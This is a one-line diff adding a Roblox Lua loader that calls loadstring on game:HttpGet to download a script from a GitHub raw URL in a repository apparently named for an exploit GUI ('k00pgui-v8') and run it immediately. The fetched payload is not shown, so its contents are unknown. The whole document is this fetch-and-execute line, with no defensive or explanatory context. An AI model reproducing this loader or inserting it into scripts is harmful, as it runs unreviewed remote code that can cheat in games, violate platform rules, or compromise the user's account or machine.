@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SirHubb/k00pgui-v8/main/message%20(15).txt"))()
